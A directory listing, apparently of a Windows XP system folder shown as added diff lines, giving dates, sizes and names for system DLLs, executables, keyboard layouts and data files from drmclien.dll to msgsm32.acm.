+08/04/2004  12:57 AM           299,520 drmclien.dll
+08/04/2004  12:56 AM            87,040 drmstor.dll
+08/04/2004  12:57 AM           695,296 drmv2clt.dll
+08/04/2004  12:56 AM            14,336 drprov.dll
+09/23/2018  12:20 AM    <DIR>          DRVSTORE
+08/23/2001  05:30 PM            28,112 drwatson.exe
+08/23/2001  05:30 PM            45,568 drwtsn32.exe
+07/17/2004  11:36 AM             4,656 ds16gt.dLL
+08/04/2004  12:56 AM            16,384 ds32gt.dll
+08/23/2001  05:30 PM            62,976 dsauth.dll
+08/04/2004  12:56 AM           181,760 dsdmo.dll
+08/04/2004  12:56 AM            71,680 dsdmoprp.dll
+08/04/2004  12:56 AM            92,672 dskquota.dll
+08/23/2001  05:30 PM           144,384 dskquoui.dll
+08/04/2004  12:56 AM           367,616 dsound.dll
+08/23/2001  05:30 PM                81 dsound.vxd
+08/04/2004  12:56 AM         1,294,336 dsound3d.dll
+08/04/2004  12:56 AM           142,336 dsprop.dll
+08/04/2004  12:56 AM             4,096 dsprpres.dll
+08/04/2004  12:56 AM           239,104 dsquery.dll
+08/23/2001  05:30 PM           218,003 dssec.dat
+08/04/2004  12:56 AM            51,200 dssec.dll
+08/03/2004  10:31 PM           137,216 dssenh.dll
+08/04/2004  12:56 AM           113,152 dsuiext.dll
+08/04/2004  12:56 AM            19,456 dswave.dll
+08/04/2004  12:56 AM            10,752 dumprep.exe
+08/04/2004  12:56 AM           304,128 duser.dll
+08/23/2001  05:30 PM            55,296 dvdplay.exe
+08/04/2004  12:56 AM            17,920 dvdupgrd.exe
+08/04/2004  12:56 AM           180,224 dwwin.exe
+08/04/2004  12:56 AM           619,008 dx7vb.dll
+08/04/2004  12:56 AM         1,227,264 dx8vb.dll
+08/04/2004  12:56 AM         1,298,432 dxdiag.exe
+08/04/2004  12:56 AM         2,113,536 dxdiagn.dll
+08/04/2004  12:56 AM           498,205 dxmasf.dll
+08/04/2004  12:56 AM           357,888 dxtmsft.dll
+08/04/2004  12:56 AM           201,728 dxtrans.dll
+08/23/2001  05:30 PM            69,886 edit.com
+08/23/2001  05:30 PM            10,790 edit.hlp
+08/23/2001  05:30 PM            12,642 edlin.exe
+08/04/2004  12:56 AM            26,624 efsadu.dll
+08/23/2001  05:30 PM           127,213 ega.cpi
+08/04/2004  12:56 AM           183,296 els.dll
+09/23/2018  12:13 AM            21,640 emptyregdb.dat
+08/04/2004  12:56 AM            20,480 encapi.dll
+08/04/2004  12:56 AM           186,368 encdec.dll
+08/23/2001  05:30 PM           103,424 EqnClass.Dll
+08/04/2004  12:56 AM            23,040 ersvc.dll
+08/04/2004  12:56 AM           243,200 es.dll
+08/04/2004  12:56 AM         1,082,368 esent.dll
+08/23/2001  05:30 PM         1,114,896 esent97.dll
+08/23/2001  05:30 PM            17,408 esentprf.dll
+08/23/2001  05:30 PM             6,708 esentprf.hxx
+08/23/2001  05:30 PM         1,015,477 esentprf.ini
+08/23/2001  05:30 PM            39,424 esentutl.exe
+08/04/2004  12:56 AM           193,024 eudcedit.exe
+08/23/2001  05:30 PM            29,338 eula.txt
+08/23/2001  05:30 PM            33,280 eventcls.dll
+08/04/2004  12:56 AM            50,176 eventcreate.exe
+08/04/2004  12:56 AM            55,808 eventlog.dll
+08/23/2001  05:30 PM            97,965 eventquery.vbs
+08/23/2001  05:30 PM            77,824 eventtriggers.exe
+08/23/2001  05:30 PM             8,704 eventvwr.exe
+08/23/2001  05:30 PM            56,678 eventvwr.msc
+08/23/2001  05:30 PM             8,424 exe2bin.exe
+08/23/2001  05:30 PM            15,872 expand.exe
+09/23/2018  05:38 AM    <DIR>          export
+08/04/2004  12:56 AM           380,957 expsrv.dll
+08/04/2004  12:56 AM            55,808 extmgr.dll
+08/04/2004  12:56 AM            45,568 extrac32.exe
+08/23/2001  05:30 PM           121,856 exts.dll
+08/23/2001  05:30 PM               882 fastopen.exe
+08/04/2004  12:56 AM            80,384 faultrep.dll
+08/23/2001  05:30 PM            14,848 fc.exe
+08/23/2001  05:30 PM           117,760 fde.dll
+08/04/2004  12:56 AM            73,728 fdeploy.dll
+08/04/2004  12:56 AM            21,504 feclient.dll
+08/04/2004  12:56 AM           337,920 filemgmt.dll
+08/23/2001  05:30 PM             9,216 find.exe
+08/04/2004  12:56 AM            27,136 findstr.exe
+08/23/2001  05:30 PM             9,216 finger.exe
+08/04/2004  12:56 AM            80,384 firewall.cpl
+08/23/2001  05:30 PM             3,072 fixmapi.exe
+08/04/2004  12:56 AM            87,552 fldrclnr.dll
+08/04/2004  12:56 AM            16,896 fltlib.dll
+08/04/2004  12:56 AM            22,528 fltMc.exe
+08/23/2001  05:30 PM            16,384 fmifs.dll
+09/23/2018  12:15 AM            90,296 FNTCACHE.DAT
+08/04/2004  12:56 AM           382,976 fontext.dll
+08/23/2001  05:30 PM            79,360 fontsub.dll
+08/04/2004  12:56 AM            20,992 fontview.exe
+08/23/2001  05:30 PM             7,168 forcedos.exe
+08/23/2001  05:30 PM            25,600 format.com
+08/04/2004  12:56 AM             9,344 framebuf.dll
+08/23/2001  05:30 PM            55,296 freecell.exe
+08/23/2001  05:30 PM            32,760 fsmgmt.msc
+08/04/2004  12:56 AM           193,024 fsquirt.exe
+08/23/2001  05:30 PM            81,408 fsusd.dll
+08/23/2001  05:30 PM            56,320 fsutil.exe
+08/04/2004  12:56 AM            42,496 ftp.exe
+08/23/2001  05:30 PM           176,128 ftsrch.dll
+08/04/2004  12:56 AM            60,416 fwcfg.dll
+08/23/2001  05:30 PM            41,472 g711codc.ax
+08/23/2001  05:30 PM            24,006 gb2312.uce
+08/23/2001  05:30 PM            76,800 gcdef.dll
+08/23/2001  05:30 PM            24,576 gdi.exe
+08/04/2004  12:56 AM           278,016 gdi32.dll
+08/23/2001  05:30 PM            24,772 geo.nls
+08/23/2001  05:30 PM            55,296 getmac.exe
+08/23/2001  05:30 PM           605,696 getuname.dll
+08/23/2001  05:30 PM           285,184 glmf32.dll
+08/04/2004  12:56 AM           122,880 glu32.dll
+08/04/2004  12:56 AM           566,784 gpedit.dll
+08/23/2001  05:30 PM            34,871 gpedit.msc
+08/03/2004  10:31 PM           101,888 gpkcsp.dll
+08/04/2004  12:56 AM             9,728 gpkrsrc.dll
+08/04/2004  12:56 AM           119,808 gpresult.exe
+08/04/2004  12:56 AM           198,656 gptext.dll
+08/23/2001  05:30 PM            57,344 gpupdate.exe
+08/23/2001  05:30 PM            26,112 graftabl.com
+08/23/2001  05:30 PM            19,694 graphics.com
+08/23/2001  05:30 PM            21,232 graphics.pro
+08/04/2004  12:56 AM            39,424 grpconv.exe
+08/04/2004  12:56 AM           265,728 h323.tsp
+09/23/2018  05:42 AM                 0 h323log.txt
+08/04/2004  12:56 AM           614,912 h323msp.dll
+08/03/2004  10:59 PM            81,280 hal.dll
+08/04/2004  12:56 AM             7,168 hccoin.dll
+08/04/2004  12:56 AM           155,136 hdwwiz.cpl
+08/23/2001  05:30 PM            14,848 help.exe
+08/03/2004  10:23 PM           526,848 hhctrl.ocx
+08/04/2004  12:56 AM            38,912 hhsetup.dll
+08/04/2004  01:05 AM            20,992 hid.dll
+08/04/2004  12:56 AM            29,696 hidphone.tsp
+08/23/2001  05:30 PM             4,768 himem.sys
+08/23/2001  05:30 PM            77,850 hlink.dll
+08/04/2004  12:56 AM           344,064 hnetcfg.dll
+08/23/2001  05:30 PM            14,848 hnetmon.dll
+08/04/2004  12:56 AM           330,752 hnetwiz.dll
+08/03/2004  10:22 PM               929 homepage.inf
+08/23/2001  05:30 PM             7,680 hostname.exe
+08/04/2004  12:56 AM           144,896 hotplug.dll
+08/23/2001  05:30 PM            44,544 hticons.dll
+08/03/2004  10:59 PM           423,936 html.iec
+08/04/2004  12:56 AM            24,576 httpapi.dll
+08/04/2004  12:56 AM            41,984 htui.dll
+08/04/2004  12:56 AM           345,088 hypertrm.dll
+08/04/2004  12:56 AM           199,680 iac25_32.ax
+09/23/2018  05:38 AM    <DIR>          ias
+08/23/2001  05:30 PM            23,552 iasacct.dll
+08/23/2001  05:30 PM            41,472 iasads.dll
+08/23/2001  05:30 PM            32,256 iashlpr.dll
+08/23/2001  05:30 PM            62,464 iasnap.dll
+08/23/2001  05:30 PM            17,920 iaspolcy.dll
+08/04/2004  12:56 AM           119,808 iasrad.dll
+08/23/2001  05:30 PM           141,312 iasrecst.dll
+08/23/2001  05:30 PM            86,528 iassam.dll
+08/23/2001  05:30 PM           247,808 iassdo.dll
+08/23/2001  05:30 PM            59,392 iassvcs.dll
+08/04/2004  12:56 AM            11,264 icaapi.dll
+08/04/2004  12:56 AM            80,384 iccvid.dll
+08/23/2001  05:30 PM            16,384 icfgnt5.dll
+08/04/2004  12:56 AM           253,952 icm32.dll
+08/04/2004  12:56 AM             3,584 icmp.dll
+08/23/2001  05:30 PM            54,784 icmui.dll
+09/23/2018  05:38 AM    <DIR>          icsxml
+08/04/2004  12:56 AM            73,728 icwdial.dll
+08/04/2004  12:56 AM            65,536 icwphbk.dll
+08/23/2001  05:30 PM            60,458 ideograf.uce
+08/04/2004  12:56 AM           120,832 idq.dll
+08/04/2004  12:56 AM            34,304 ie4uinit.exe
+08/04/2004  12:56 AM           139,264 ieakeng.dll
+08/04/2004  12:56 AM           216,576 ieaksie.dll
+08/23/2001  05:30 PM           221,184 ieakui.dll
+08/04/2004  12:56 AM           323,584 iedkcs32.dll
+08/04/2004  12:56 AM            81,920 ieencode.dll
+08/04/2004  12:56 AM           249,344 iepeers.dll
+08/04/2004  12:56 AM            48,640 iernonce.dll
+08/04/2004  12:56 AM            62,976 iesetup.dll
+08/03/2004  10:22 PM            23,024 ieuinit.inf
+08/04/2004  12:56 AM           114,688 iexpress.exe
+08/04/2004  12:56 AM           135,680 ifmon.dll
+08/23/2001  05:30 PM            70,656 ifsutil.dll
+08/04/2004  12:56 AM             8,192 igmpagnt.dll
+08/23/2001  05:30 PM             9,216 iissuba.dll
+08/04/2004  12:56 AM            81,920 ils.dll
+08/04/2004  12:56 AM            16,384 imaadp32.acm
+08/04/2004  12:56 AM           144,384 imagehlp.dll
+08/04/2004  12:56 AM           150,016 imapi.exe
+09/23/2018  05:38 AM    <DIR>          IME
+08/04/2004  12:56 AM            36,921 imeshare.dll
+08/04/2004  12:56 AM            35,840 imgutil.dll
+08/04/2004  12:56 AM           110,080 imm32.dll
+08/04/2004  12:56 AM           274,432 inetcfg.dll
+08/04/2004  12:56 AM           678,400 inetcomm.dll
+08/04/2004  12:56 AM           358,400 inetcpl.cpl
+08/23/2001  05:30 PM           110,592 inetcplc.dll
+08/04/2004  12:56 AM            33,280 inetmib1.dll
+08/04/2004  12:56 AM            75,264 inetpp.dll
+08/04/2004  12:56 AM            15,872 inetppui.dll
+08/04/2004  12:56 AM            48,128 inetres.dll
+09/23/2018  05:38 AM    <DIR>          inetsrv
+08/23/2001  05:30 PM           450,560 infosoft.dll
+08/04/2004  12:56 AM           147,456 initpki.dll
+08/04/2004  12:56 AM           123,392 input.dll
+08/04/2004  12:56 AM            96,256 inseng.dll
+07/17/2004  11:38 AM           956,990 instcat.sql
+08/04/2004  12:56 AM           129,536 intl.cpl
+08/23/2001  05:30 PM            30,720 iologmsg.dll
+08/04/2004  12:56 AM            17,408 ipconf.tsp
+08/04/2004  12:56 AM            55,808 ipconfig.exe
+08/04/2004  12:56 AM            94,720 iphlpapi.dll
+08/23/2001  05:30 PM           154,112 ipmontr.dll
+08/04/2004  12:56 AM           331,264 ipnathlp.dll
+08/04/2004  12:56 AM           330,752 ippromon.dll
+08/23/2001  05:30 PM             3,584 iprop.dll
+08/23/2001  05:30 PM             4,096 iprtprio.dll
+08/23/2001  05:30 PM           169,984 iprtrmgr.dll
+08/23/2001  05:30 PM            44,032 ipsec6.exe
+08/04/2004  12:56 AM           349,696 ipsecsnp.dll
+08/04/2004  12:56 AM           182,784 ipsecsvc.dll
+08/04/2004  12:56 AM           384,000 ipsmsnap.dll
+08/04/2004  12:56 AM            53,248 ipv6.exe
+08/04/2004  12:56 AM            59,904 ipv6mon.dll
+08/23/2001  05:30 PM            83,968 ipxmontr.dll
+08/23/2001  05:30 PM            69,120 ipxpromn.dll
+08/23/2001  05:30 PM            21,504 ipxrip.dll
+08/04/2004  12:56 AM            23,552 ipxroute.exe
+08/23/2001  05:30 PM            39,936 ipxrtmgr.dll
+08/23/2001  05:30 PM            66,560 ipxsap.dll
+08/23/2001  05:30 PM            20,992 ipxwan.dll
+08/23/2001  05:30 PM           199,168 ir32_32.dll
+08/04/2004  12:56 AM           848,384 ir41_32.ax
+08/04/2004  12:56 AM           120,320 ir41_qc.dll
+08/04/2004  12:56 AM           338,432 ir41_qcx.dll
+08/04/2004  12:56 AM           755,200 ir50_32.dll
+08/04/2004  12:56 AM           200,192 ir50_qc.dll
+08/04/2004  12:56 AM           183,808 ir50_qcx.dll
+08/23/2001  05:30 PM            13,312 irclass.dll
+08/04/2004  12:56 AM           380,416 irprops.cpl
+08/04/2004  12:56 AM            81,920 isign32.dll
+08/04/2004  12:56 AM            32,768 isrdbg32.dll
+08/04/2004  12:56 AM           143,872 itircl.dll
+08/04/2004  12:56 AM           134,144 itss.dll
+08/04/2004  12:56 AM           192,000 iuengine.dll
+08/04/2004  12:56 AM           154,624 ivfsrc.ax
+08/04/2004  12:56 AM            54,272 ixsso.dll
+08/04/2004  01:05 AM            47,616 iyuv_32.dll
+08/23/2001  05:30 PM           362,496 jet500.dll
+08/23/2001  05:30 PM            44,544 jgaw400.dll
+08/23/2001  05:30 PM           144,896 jgdw400.dll
+08/23/2001  05:30 PM            35,840 jgmd400.dll
+08/23/2001  05:30 PM            42,496 jgpl400.dll
+08/23/2001  05:30 PM            45,568 jgsd400.dll
+08/23/2001  05:30 PM            65,536 jgsh400.dll
+08/23/2001  05:30 PM            47,952 jobexec.dll
+08/04/2004  12:56 AM            68,608 joy.cpl
+08/04/2004  12:56 AM           450,560 jscript.dll
+08/04/2004  12:56 AM            15,872 jsproxy.dll
+08/23/2001  05:30 PM             6,948 kanji_1.uce
+08/23/2001  05:30 PM             8,484 kanji_2.uce
+08/23/2001  05:30 PM            14,710 kb16.com
+08/23/2001  05:30 PM             6,656 KBDAL.DLL
+08/23/2001  05:30 PM             5,632 kbdaze.dll
+08/23/2001  05:30 PM             5,632 kbdazel.dll
+08/23/2001  05:30 PM             6,144 kbdbe.dll
+08/23/2001  05:30 PM             6,144 kbdbene.dll
+08/23/2001  05:30 PM             5,632 kbdblr.dll
+08/23/2001  05:30 PM             6,144 kbdbr.dll
+08/23/2001  05:30 PM             5,632 kbdbu.dll
+08/23/2001  05:30 PM             6,144 kbdca.dll
+08/23/2001  05:30 PM             7,680 kbdcan.dll
+08/23/2001  05:30 PM             6,656 kbdcr.dll
+08/23/2001  05:30 PM             7,168 kbdcz.dll
+08/23/2001  05:30 PM             6,656 kbdcz1.dll
+08/23/2001  05:30 PM             6,656 kbdcz2.dll
+08/23/2001  05:30 PM             6,144 kbdda.dll
+08/23/2001  05:30 PM             5,120 kbddv.dll
+08/23/2001  05:30 PM             6,144 kbdes.dll
+08/23/2001  05:30 PM             6,144 kbdest.dll
+08/23/2001  05:30 PM             6,144 kbdfc.dll
+08/23/2001  05:30 PM             6,144 kbdfi.dll
+08/04/2004  12:56 AM             7,168 kbdfi1.dll
+08/23/2001  05:30 PM             6,144 kbdfo.dll
+08/23/2001  05:30 PM             6,144 kbdfr.dll
+08/23/2001  05:30 PM             5,632 kbdgae.dll
+08/23/2001  05:30 PM             6,144 kbdgkl.dll
+08/23/2001  05:30 PM             6,144 kbdgr.dll
+08/23/2001  05:30 PM             6,144 kbdgr1.dll
+08/23/2001  05:30 PM             5,632 kbdhe.dll
+08/23/2001  05:30 PM             5,632 kbdhe220.dll
+08/23/2001  05:30 PM             5,632 kbdhe319.dll
+08/23/2001  05:30 PM             6,144 kbdhela2.dll
+08/23/2001  05:30 PM             6,656 kbdhela3.dll
+08/23/2001  05:30 PM             8,192 kbdhept.dll
+08/23/2001  05:30 PM             6,656 kbdhu.dll
+08/23/2001  05:30 PM             5,632 kbdhu1.dll
+08/23/2001  05:30 PM             6,144 kbdic.dll
+08/04/2004  12:56 AM             6,144 kbdinbe1.dll
+08/04/2004  12:56 AM             6,656 kbdinben.dll
+08/04/2004  12:56 AM             6,656 kbdinmal.dll
+08/23/2001  05:30 PM             5,632 kbdir.dll
+08/23/2001  05:30 PM             5,632 kbdit.dll
+08/23/2001  05:30 PM             5,632 kbdit142.dll
+08/23/2001  05:30 PM             5,632 kbdkaz.dll
+08/23/2001  05:30 PM             5,632 kbdkyr.dll
+08/23/2001  05:30 PM             6,656 kbdla.dll
+08/23/2001  05:30 PM             5,632 kbdlt.dll
+08/23/2001  05:30 PM             5,632 kbdlt1.dll
+08/23/2001  05:30 PM             6,144 kbdlv.dll
+08/23/2001  05:30 PM             6,144 kbdlv1.dll
+08/23/2001  05:30 PM             6,144 kbdmac.dll
+08/04/2004  12:56 AM             5,632 kbdmaori.dll
+08/04/2004  12:56 AM             6,144 kbdmlt47.dll
+08/04/2004  12:56 AM             6,144 kbdmlt48.dll
+08/23/2001  05:30 PM             5,632 kbdmon.dll
+08/23/2001  05:30 PM             6,144 kbdne.dll
+08/23/2001  05:30 PM             7,168 kbdnec.dll
+08/23/2001  05:30 PM             6,144 kbdno.dll
+08/04/2004  12:56 AM             7,168 kbdno1.dll
+08/23/2001  05:30 PM             6,656 kbdpl.dll
+08/23/2001  05:30 PM             5,632 kbdpl1.dll
+08/23/2001  05:30 PM             6,144 kbdpo.dll
+08/23/2001  05:30 PM             5,632 kbdro.dll
+08/23/2001  05:30 PM             5,632 kbdru.dll
+08/23/2001  05:30 PM             5,632 kbdru1.dll
+08/23/2001  05:30 PM             6,144 kbdsf.dll
+08/23/2001  05:30 PM             6,656 kbdsg.dll
+08/23/2001  05:30 PM             6,656 kbdsl.dll
+08/23/2001  05:30 PM             6,656 kbdsl1.dll
+08/04/2004  12:56 AM             7,680 kbdsmsfi.dll
+08/04/2004  12:56 AM             7,680 kbdsmsno.dll
+08/23/2001  05:30 PM             6,144 kbdsp.dll
+08/23/2001  05:30 PM             6,144 kbdsw.dll
+08/23/2001  05:30 PM             5,632 kbdtat.dll
+08/23/2001  05:30 PM             6,144 kbdtuf.dll
+08/23/2001  05:30 PM             6,144 kbdtuq.dll
+08/23/2001  05:30 PM             5,632 kbduk.dll
+08/04/2004  12:56 AM             7,168 kbdukx.dll
+08/23/2001  05:30 PM             5,632 kbdur.dll
+08/23/2001  05:30 PM             5,632 kbdus.dll
+08/23/2001  05:30 PM             6,144 kbdusl.dll
+08/23/2001  05:30 PM             6,144 kbdusr.dll
+08/23/2001  05:30 PM             6,144 kbdusx.dll
+08/23/2001  05:30 PM             5,632 kbduzb.dll
+08/23/2001  05:30 PM             5,632 kbdycc.dll
+08/23/2001  05:30 PM             6,656 kbdycl.dll
+08/03/2004  10:59 PM             7,424 kd1394.dll
+08/23/2001  05:30 PM             7,040 kdcom.dll
+08/04/2004  12:56 AM           294,400 kerberos.dll
+08/04/2004  12:56 AM           983,552 kernel32.dll
+08/23/2001  05:30 PM            42,809 key01.sys
+08/23/2001  05:30 PM             2,000 keyboard.drv
+08/03/2004  10:46 PM            42,537 keyboard.sys
+08/04/2004  12:56 AM           150,528 keymgr.dll
+08/04/2004  12:56 AM            33,280 kmddsp.tsp
+08/23/2001  05:30 PM            12,876 korean.uce
+08/03/2004  10:49 PM            92,224 krnl386.exe
+08/04/2004  06:26 AM           130,048 ksproxy.ax
+08/04/2004  06:26 AM             4,096 ksuser.dll
+08/04/2004  12:56 AM           290,816 l3codeca.acm
+08/23/2001  05:30 PM            83,456 l3codecx.ax
+08/23/2001  05:30 PM             9,728 label.exe
+08/23/2001  05:30 PM            89,600 langwrbk.dll
+08/23/2001  05:30 PM           221,600 lanman.drv
+08/04/2004  12:56 AM             6,656 laprxy.dll
+08/04/2004  12:56 AM           423,936 licdll.dll
+08/04/2004  12:56 AM            22,016 licmgr10.dll
+08/04/2004  12:56 AM            58,880 licwmi.dll
+08/23/2001  05:30 PM            29,696 lights.exe
+08/04/2004  12:56 AM            18,944 linkinfo.dll
+08/04/2004  12:56 AM            13,824 lmhsvc.dll
+08/04/2004  12:56 AM           399,872 lmrt.dll
+08/23/2001  05:30 PM            25,088 lnkstub.exe
+08/23/2001  05:30 PM             1,131 loadfix.com
+08/04/2004  12:56 AM            97,280 loadperf.dll
+07/17/2004  11:48 AM           249,270 locale.nls
+08/04/2004  12:56 AM           221,696 localsec.dll
+08/04/2004  12:56 AM           341,504 localspl.dll
+08/04/2004  12:56 AM            11,776 localui.dll
+08/04/2004  12:56 AM            75,264 locator.exe
+08/23/2001  05:30 PM             5,120 lodctr.exe
+08/04/2004  12:56 AM           103,936 logagent.exe
+08/23/2001  05:30 PM            50,176 loghours.dll
+07/17/2004  11:42 AM               487 login.cmd
+08/04/2004  12:56 AM            59,392 logman.exe
+08/23/2001  05:30 PM            15,360 logoff.exe
+08/04/2004  12:56 AM           220,672 logon.scr
+08/04/2004  12:56 AM           514,560 logonui.exe
+08/04/2004  12:56 AM            22,016 lpk.dll
+08/23/2001  05:30 PM             6,144 lpq.exe
+08/23/2001  05:30 PM             8,192 lpr.exe
+08/04/2004  12:56 AM            10,240 lprhelp.dll
+08/23/2001  05:30 PM             9,216 lprmonui.dll
+08/04/2004  12:56 AM           721,920 lsasrv.dll
+08/04/2004  12:56 AM            13,312 lsass.exe
+08/23/2001  05:30 PM            42,166 lusrmgr.msc
+08/23/2001  05:30 PM             2,560 lz32.dll
+08/23/2001  05:30 PM             9,936 lzexpand.dll
+08/23/2001  05:30 PM               168 l_except.nls
+08/23/2001  05:30 PM             7,046 l_intl.nls
+09/23/2018  12:14 AM    <DIR>          Macromed
+08/04/2004  12:56 AM            72,704 magnify.exe
+08/23/2001  05:30 PM             8,192 mag_hook.dll
+08/23/2001  05:30 PM           187,904 main.cpl
+08/04/2004  12:56 AM            85,504 makecab.exe
+08/23/2001  05:30 PM           112,128 mapi32.dll
+08/23/2001  05:30 PM           112,128 mapistub.dll
+08/04/2004  12:56 AM            14,848 mcastmib.dll
+08/23/2001  05:30 PM            10,240 mcd32.dll
+08/23/2001  05:30 PM            10,496 mcdsrv32.dll
+08/23/2001  05:30 PM             4,608 mchgrcoi.dll
+08/23/2001  05:30 PM            73,376 mciavi.drv
+08/04/2004  12:56 AM            84,480 mciavi32.dll
+08/23/2001  05:30 PM            17,408 mcicda.dll
+08/23/2001  05:30 PM             8,192 mciole16.dll
+08/23/2001  05:30 PM             7,680 mciole32.dll
+08/04/2004  12:56 AM            35,328 mciqtz32.dll
+08/04/2004  12:56 AM            23,040 mciseq.dll
+08/23/2001  05:30 PM            25,264 mciseq.drv
+08/04/2004  12:56 AM            23,552 mciwave.dll
+08/23/2001  05:30 PM            28,160 mciwave.drv
+08/23/2001  05:30 PM            50,176 mdhcp.dll
+08/04/2004  12:56 AM           118,272 mdminst.dll
+08/23/2001  05:30 PM           147,968 mdwmdmsp.dll
+08/23/2001  05:30 PM            39,274 mem.exe
+08/04/2004  12:56 AM            39,936 mf3216.dll
+08/23/2001  05:30 PM           924,432 mfc40.dll
+08/23/2001  05:30 PM           924,432 mfc40u.dll
+08/04/2004  12:56 AM         1,028,096 mfc42.dll
+08/04/2004  12:56 AM         1,024,000 mfc42u.dll
+08/04/2004  12:56 AM            22,528 mfcsubs.dll
+08/04/2004  12:56 AM            14,848 mgmtapi.dll
+08/23/2001  05:30 PM            46,258 mib.bin
+08/04/2004  12:56 AM            18,944 midimap.dll
+08/04/2004  12:56 AM            60,928 miglibnt.dll
+08/23/2001  05:30 PM            51,712 migpwd.exe
+08/23/2001  05:30 PM            18,944 mimefilt.dll
+08/23/2001  05:30 PM           673,088 mlang.dat
+08/04/2004  12:56 AM           586,240 mlang.dll
+08/23/2001  05:30 PM             3,584 mll_hp.dll
+08/23/2001  05:30 PM             7,680 mll_mtf.dll
+08/23/2001  05:30 PM             5,632 mll_qic.dll
+08/04/2004  12:56 AM           815,104 mmc.exe
+08/04/2004  12:56 AM            70,656 mmcbase.dll
+08/04/2004  12:56 AM         1,192,960 mmcndmgr.dll
+08/04/2004  12:56 AM            50,688 mmcshext.dll
+08/23/2001  05:30 PM             1,492 mmdriver.inf
+08/23/2001  05:30 PM            12,288 mmdrv.dll
+08/04/2004  12:56 AM            17,408 mmfutil.dll
+08/04/2004  12:56 AM           618,496 mmsys.cpl
+08/03/2004  10:51 PM            68,768 mmsystem.dll
+08/23/2001  05:30 PM             1,152 mmtask.tsk
+08/23/2001  05:30 PM           119,808 mmutilse.dll
+08/04/2004  12:56 AM            34,560 mnmdd.dll
+08/04/2004  12:56 AM            32,768 mnmsrvc.exe
+08/04/2004  12:56 AM           207,360 mobsync.dll
+08/04/2004  12:56 AM           143,360 mobsync.exe
+08/23/2001  05:30 PM            19,456 mode.com
+08/04/2004  12:56 AM           153,600 modemui.dll
+08/23/2001  05:30 PM            10,112 modex.dll
+08/23/2001  05:30 PM            15,872 more.com
+08/04/2004  12:56 AM           216,064 moricons.dll
+08/23/2001  05:30 PM             8,192 mountvol.exe
+08/23/2001  05:30 PM             2,032 mouse.drv
+08/04/2004  12:56 AM           310,272 mp43dmod.dll
+08/04/2004  12:56 AM           384,512 mp4sdmod.dll
+08/04/2004  12:56 AM           118,272 mpeg2data.ax
+08/04/2004  12:56 AM           148,992 mpg2splt.ax
+08/04/2004  12:56 AM           240,640 mpg4dmod.dll
+08/04/2004  12:56 AM           262,144 mpg4ds32.ax
+08/04/2004  12:56 AM           123,392 mplay32.exe
+08/23/2001  05:30 PM            22,016 mpnotify.exe
+08/04/2004  12:56 AM            59,904 mpr.dll
+08/04/2004  12:56 AM            87,040 mprapi.dll
+08/23/2001  05:30 PM            69,120 mprddm.dll
+08/23/2001  05:30 PM            49,152 mprdim.dll
+08/23/2001  05:30 PM            99,840 mprmsg.dll
+08/23/2001  05:30 PM            47,104 mprui.dll
+08/04/2004  12:56 AM           138,240 mqad.dll
+08/04/2004  12:56 AM            19,968 mqbkup.exe
+08/23/2001  05:30 PM            10,752 mqcertui.dll
+08/04/2004  12:56 AM            47,104 mqdscli.dll
+08/23/2001  05:30 PM            60,928 mqgentr.dll
+08/04/2004  12:56 AM            16,896 mqise.dll
+08/04/2004  12:56 AM            89,088 mqlogmgr.dll
+08/04/2004  12:56 AM           225,280 mqoa.dll
+08/23/2001  05:30 PM            81,408 mqoa.tlb
+08/23/2001  05:30 PM            36,864 mqoa10.tlb
+08/23/2001  05:30 PM            55,296 mqoa20.tlb
+08/23/2001  05:30 PM             8,192 mqperf.dll
+08/23/2001  05:30 PM            10,110 mqperf.ini
+08/23/2001  05:30 PM             2,755 mqprfsym.h
+08/04/2004  12:56 AM           660,992 mqqm.dll
+08/04/2004  12:56 AM           177,152 mqrt.dll
+08/04/2004  12:56 AM           123,392 mqrtdep.dll
+08/04/2004  12:56 AM            95,744 mqsec.dll
+08/04/2004  12:56 AM           517,632 mqsnap.dll
+08/04/2004  12:56 AM             4,608 mqsvc.exe
+08/04/2004  12:56 AM           117,248 mqtgsvc.exe
+08/04/2004  12:56 AM           186,880 mqtrig.dll
+08/04/2004  12:56 AM            48,640 mqupgrd.dll
+08/04/2004  12:56 AM           471,552 mqutil.dll
+08/23/2001  05:30 PM            12,800 mrinfo.exe
+08/23/2001  05:30 PM           102,912 msaatext.dll
+08/23/2001  05:30 PM            61,168 msacm.dll
+08/04/2004  12:56 AM            71,680 msacm32.dll
+08/23/2001  05:30 PM            20,480 msacm32.drv
+08/04/2004  12:56 AM           221,184 msadds32.ax
+08/04/2004  12:56 AM            14,848 msadp32.acm
+08/04/2004  12:56 AM             3,584 msafd.dll
+08/04/2004  12:56 AM            86,016 msapsspc.dll
+08/04/2004  12:56 AM            57,344 msasn1.dll
+08/04/2004  12:56 AM           294,912 msaud32.acm
+08/23/2001  05:30 PM            65,024 msaudite.dll
+08/23/2001  05:30 PM             7,168 mscat32.dll
+08/23/2001  05:30 PM               817 mscdexnt.exe
+08/04/2004  12:56 AM            73,728 mscms.dll
+08/04/2004  12:56 AM            69,632 msconf.dll
+08/04/2004  12:56 AM            12,288 mscpx32r.dLL
+08/04/2004  12:56 AM            36,864 mscpxl32.dLL
+08/04/2004  12:56 AM           294,400 MSCTF.dll
+08/04/2004  12:56 AM           177,152 MSCTFIME.IME
+08/04/2004  12:56 AM            69,120 MSCTFP.dll
+08/04/2004  12:56 AM           118,784 msdadiag.dll
+08/04/2004  12:56 AM           151,552 msdart.dll
+08/03/2004  10:20 PM            12,288 msdatsrc.tlb
+08/04/2004  12:56 AM            14,336 msdmo.dll
+09/23/2018  12:13 AM    <DIR>          MsDtc
+08/04/2004  12:56 AM             6,144 msdtc.exe
+08/04/2004  12:56 AM            58,880 msdtclog.dll
+08/23/2001  05:30 PM               768 msdtcprf.h
+08/23/2001  05:30 PM             1,931 msdtcprf.ini
+08/04/2004  12:56 AM           425,472 msdtcprx.dll
+08/04/2004  12:56 AM           949,248 msdtctm.dll
+08/04/2004  12:56 AM           161,280 msdtcuiu.dll
+08/03/2004  10:51 PM           844,314 msdxm.ocx
+08/04/2004  12:56 AM             4,126 msdxmlc.dll
+08/23/2001  05:30 PM            94,282 msencode.dll
+08/04/2004  12:56 AM           512,029 msexch40.dll
+08/04/2004  12:56 AM           319,517 msexcl40.dll
+08/04/2004  12:56 AM           537,088 msftedit.dll
+08/23/2001  05:30 PM            20,992 msg.exe
+08/23/2001  05:30 PM             9,216 msg711.acm
+08/23/2001  05:30 PM           118,784 msg723.acm
+08/04/2004  12:56 AM           994,304 msgina.dll
+08/23/2001  05:30 PM            19,968 msgsm32.acm
